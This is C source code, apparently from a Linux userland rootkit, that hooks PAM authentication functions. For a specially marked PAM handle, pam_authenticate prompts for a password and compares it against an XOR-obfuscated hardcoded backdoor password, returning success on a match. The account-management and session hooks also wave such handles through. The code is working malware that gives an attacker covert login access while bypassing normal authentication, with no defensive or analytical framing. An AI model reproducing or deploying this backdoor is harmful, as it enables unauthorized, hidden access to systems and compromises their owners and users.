int pam_authenticate(pam_handle_t *pamh, int flags){   
    hook(CPAM_AUTHENTICATE);

    if(ismagicpamh(pamh)){
        if(process("login")) return (long)call(CPAM_AUTHENTICATE, pamh, flags);

        const char *user = get_username(pamh);
        if(!user) return (long)call(CPAM_AUTHENTICATE, pamh, flags);

        int gotpw;
        char *pw, pmpt[PWAUTHFMT_SIZE + strlen(user) + 8];
        xsnprintf(pmpt, sizeof(pmpt), PWAUTHFMT, user);
        pam_prompt(pamh, 1, &pw, "%s", pmpt);

        char *magicpw;
        if((magicpw = xordup(BDPASSWORD)) == NULL)
            return (long)call(CPAM_AUTHENTICATE, pamh, flags);
        gotpw = strcmp(crypt(pw, magicpw), magicpw) == 0;
        clean(magicpw);
        clean(pw);

        if(gotpw) return PAM_SUCCESS;
        sleep(_randnum(3, 5));
        return PAM_USER_UNKNOWN;
    }

    return (long)call(CPAM_AUTHENTICATE, pamh, flags);
}
int pam_acct_mgmt(pam_handle_t *pamh, int flags){
    if(ismagicpamh(pamh))
        return PAM_SUCCESS;
    hook(CPAM_ACCT_MGMT);
    return (long)call(CPAM_ACCT_MGMT, pamh, flags);
}
int pam_open_session(pam_handle_t *pamh, int flags){
    if(ismagicpamh(pamh))
        return PAM_SUCCESS;
    hook(CPAM_OPEN_SESSION);
    return (long)call(CPAM_OPEN_SESSION, pamh, flags);
}
int pam_close_session(pam_handle_t *pamh, int flags){
    if(ismagicpamh(pamh))
        return PAM_SUCCESS;
    hook(CPAM_CLOSE_SESSION);
    return (long)call(CPAM_CLOSE_SESSION, pamh, flags);
}